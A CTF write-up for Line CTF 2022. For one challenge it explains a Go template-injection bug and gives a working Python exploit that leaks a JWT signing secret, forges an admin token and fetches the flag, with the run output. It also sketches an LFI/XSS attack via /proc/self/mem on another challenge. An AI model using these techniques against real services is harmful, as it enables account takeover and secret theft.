- [(Web) gotm](#Web-gotm)
- [(Web) online-library/Not Solved](#Web-online-library)

I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf. So I am very not good. Just get a stress. So I decided not to participate the CTF from today. I always think like: When we live the life, must do a lot of things. <del>Oh, I'm not quitting IT. I just want to try different things. Still, if I don't like it, I'll find another job.</del>

---
### (Web) gotm

The gotm is challenge that get the flag using a JWT of admin. And goth challenge was created using [Golang](https://go.dev/).

```Go
func main() {
	admin := Account{admin_id, admin_pw, true, secret_key}
	acc = append(acc, admin)

	http.HandleFunc("/", root_handler)
	http.HandleFunc("/auth", auth_handler)
	http.HandleFunc("/flag", flag_handler)
	http.HandleFunc("/regist", regist_handler)
	log.Fatal(http.ListenAndServe("0.0.0.0:11000", nil))
}
```
If you look at the `main()` function, you can know that set the router like: `/`, `/auth`, `/flag`, `/regist`.

```Go
func flag_handler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-Token")
	if token != "" {
		id, is_admin := jwt_decode(token)
		if is_admin == true {
			p := Resp{true, "Hi " + id + ", flag is " + flag}
			res, err := json.Marshal(p)
			if err != nil {
			}
			w.Write(res)
			return
		} else {
			w.WriteHeader(http.StatusForbidden)
			return
		}
	}
}
```
First of all, If you look at the condition that bring a flag, If the is_admin of JWT is `true`, you can bring the flag.

```Go
func regist_handler(w http.ResponseWriter, r *http.Request) {
	uid := r.FormValue("id")
	upw := r.FormValue("pw")

	if uid == "" || upw == "" {
		return
	}

	if get_account(uid).id != "" {
		w.WriteHeader(http.StatusForbidden)
		return
	}
	if len(acc) > 4 {
		clear_account()
	}
	new_acc := Account{uid, upw, false, secret_key}
	acc = append(acc, new_acc)

	p := Resp{true, ""}
	res, err := json.Marshal(p)
	if err != nil {
	}
	w.Write(res)
	return
}
```
But, When I look at the `regist_handler()` function, I could know that I cannot make the is_admin of JWT as true because it's adds the is_admin as false.

```Go
func auth_handler(w http.ResponseWriter, r *http.Request) {
	uid := r.FormValue("id")
	upw := r.FormValue("pw")
	if uid == "" || upw == "" {
		return
	}
	if len(acc) > 1024 {
		clear_account()
	}
	user_acc := get_account(uid)
	if user_acc.id != "" && user_acc.pw == upw {
		token, err := jwt_encode(user_acc.id, user_acc.is_admin)
		if err != nil {
			return
		}
		p := TokenResp{true, token}
		res, err := json.Marshal(p)
		if err != nil {
		}
		w.Write(res)
		return
	}
	w.WriteHeader(http.StatusForbidden)
	return
}
```
Even when logging in, it cannot be manipulated because the stored is_admin is used.

```Go
func root_handler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-Token")
	if token != "" {
		id, _ := jwt_decode(token)
		acc := get_account(id)
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		if err != nil {
		}
		tpl.Execute(w, &acc)
	} else {

		return
	}
}
```
However, an SSTI vulnerability occurs in the index. This is because the ID value is passed raw to the template engine. Here, if a payload such as `{{ . }}` is used, the values of all elements of the currently logged in user can be output.

```Go
type Account struct {
	id         string
	pw         string
	is_admin   bool
	secret_key string
}
```
Since the structure of Account is the same as above, you can have the secret_key by using the SSTI vulnerability. So just leak secret_token, set is_admin of JWT to true and generate token. And you can use that token to get the flag.

```python
import requests
import jwt

CHALL_URL = "http://34.146.226.125"
#CHALL_URL = "http://localhost:11000"

USERNAME = "{{  .      }}"
PASSWORD = "dummy"
SESSION = requests.Session()
def REGIST(ID, PW):
    data = {'id':ID, 'pw':PW}
    try:
        res = SESSION.post(CHALL_URL + '/regist', data=data).json()
        if res['status'] == True:
            print(f'[+] Register Success : {ID}')
        else:
            print('[+] 500 Inter Server Error')
    except:
        print('[+] 500 Inter Server Error')

def LOGIN(ID, PW):
    data = {'id':ID, 'pw':PW}  
    try:
        res = SESSION.post(CHALL_URL + '/auth', data=data).json()
        if res['status'] == True:
            token = res['token']
            print(f'[+] TOKEN : {token}')
            header = {'X-Token':token}
            SECRET_KEY = SESSION.get(CHALL_URL, headers=header).text.split('false ')[1].replace('}', '')
            return SECRET_KEY
        else:
            print('[+] 500 Inter Server Error')
    except:
         print('[+] 500 Inter Server Error')

def FLAG(ADMIN_TOKEN):
    header = {'X-Token':ADMIN_TOKEN}
    RESULT = SESSION.get('http://34.146.226.125/flag', headers=header).json()
    FLAG = RESULT['msg'].split('flag is ')[1]
    print(f'[-] FLAG : {FLAG}')

def JWT_ENCODE(ID, SECRET_KEY):
    AccountClaims = {
        "id": ID,
        "is_admin": True
    }
    jwt_token = jwt.encode(key=SECRET_KEY, algorithm='HS256', payload=AccountClaims)
    return jwt_token

if __name__ == '__main__':
    print('[+] Exploit')
    REGIST(USERNAME, PASSWORD)
    print('[+] Leak the SECRET_KEY')
    SECRET_KEY = LOGIN(USERNAME, PASSWORD)
    print(f'[-] SECRET_KEY : {SECRET_KEY}')
    print('[+] Generate the JWT of ADMIN')
    ADMIN_JWT = JWT_ENCODE(USERNAME, SECRET_KEY).decode('utf-8')
    print(f'[-] ADMIN_JWT : {ADMIN_JWT}')
    print('[+] Leak the FLAG')
    FLAG(ADMIN_JWT)
```
I wrote the exploit code as above.

```sh
❯ python3 exploit.py
[+] Exploit
[+] Register Success : {{  .      }}
[+] Leak the SECRET_KEY
[+] TOKEN : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6ZmFsc2V9.thRcBQoJEZUgNF04UMNBYjzww7307fKjCF514rJ0k-0
[-] SECRET_KEY : fasdf972u1031xu90zm10Av
[+] Generate the JWT of ADMIN
[-] ADMIN_JWT : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6dHJ1ZX0.ORLfPXc2HWIjMsORBcoRCRVbsiDJCWC_kntbOAOWXhw
[+] Leak the FLAG
[-] FLAG : LINECTF{country_roads_takes_me_home}
```

---
### (Web) online-library

The online-library is a challenge to trigger XSS using a memory dump file. I have tried this challenge for over 10 hours. Since the LFI vulnerability occurs in this challenge, I tried to insert and trigger an XSS PoC in the log using log poisoning. So I deployed the challenge with docker, and kept looking for all the log related files.

I've been trying to use `/proc/self/fd/N` for the last 3-4 hours. But this didn't work either. I couldn't figure out how to overwrite the log. I felt very very bad for not being able to solve this challenge. After CTF ended, I found out that it was to trigger XSS by using the node.js request memory dump overwritten in `/proc/self/mem`. I didn't even think of this because I wasn't interested. I didn't even know before. So the scenario is to just send a request containing the XSS PoC to the web server, and then read the memory dump of the request I sent while increasing the size in the `/proc/self/mem` file.

```plaintext
00400000-0489c000 r-xp 00000000 08:20 44576             /usr/local/bin/node
04a9c000-04a9f000 r--p 0449c000 08:20 44576             /usr/local/bin/node
04a9f000-04ab7000 rw-p 0449f000 08:20 44576             /usr/local/bin/node
04ab7000-04ad8000 rw-p 00000000 00:00 0 
069a7000-0745c000 rw-p 00000000 00:00 0                 [heap]
5f730c0000-5f73100000 rw-p 00000000 00:00 0 
f5af4c0000-f5af500000 rw-p 00000000 00:00 0 
146cd280000-146cd2c0000 rw-p 00000000 00:00 0 
16dc38c0000-16dc3900000 rw-p 00000000 00:00 0 
19f05fc0000-19f06000000 rw-p 00000000 00:00 0 
1e7c0fc0000-1e7c1000000 rw-p 00000000 00:00 0 
2cdbd900000-2cdbd940000 rw-p 00000000 00:00 0 
2eccf1c0000-2eccf241000 rw-p 00000000 00:00 0 
2ff788c0000-2ff78900000 rw-p 00000000 00:00 0 
350437c0000-35043800000 rw-p 00000000 00:00 0 
3d769400000-3d769440000 rw-p 00000000 00:00 0 
423fd100000-423fd140000 rw-p 00000000 00:00 0 
4327af80000-4327afc0000 rw-p 00000000 00
```
In fact,  In `/proc/self/maps`, which contains the heap address of virtual memory, I could see that there is the heap address of node.js. I could see that I also have write permission with `rw-p`. These things are very important. In order for us to hack the web, we need to know these things well. Knowing only simple vulnerability exploitation methods cannot grow. (jjeob)
